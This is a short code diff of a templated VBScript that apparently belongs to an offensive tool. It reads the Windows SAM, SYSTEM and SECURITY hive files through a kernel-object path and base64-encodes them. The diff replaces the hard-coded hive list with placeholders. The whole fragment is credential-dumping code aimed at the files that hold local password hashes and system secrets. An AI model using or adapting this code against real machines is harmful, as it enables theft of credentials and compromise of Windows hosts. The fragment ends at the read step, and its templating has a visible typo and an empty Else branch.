@@ -4,13 +4,18 @@ set fso = CreateObject("Scripting.FileSystemObject")
 ClassName = "REPLACE_WITH_CLASSNAME"
 InstancePrefix = "RELEACE_WITH_UUID"
 KernelObject = "RELEACE_WITH_KERNELOBJECT"
+Path = "RELEACE_WITH_PATH"
 
 Main()
 
 Function Main()
-    files = Array("sam", "system", "security")
+    files = Array(REPLACE_WITH_FILES)
     For each file in files
-        ntPath = KernelObject & "\windows\system32\config\" & file
+        If file = "system" Then
+            Path = "\windows\system32\config\"
+        Else
+        End If
+        ntPath = KernelObject & Path & file
         
         b64data = ReadFileWithNTPath(ntPath)
         If b64data <> "" Then
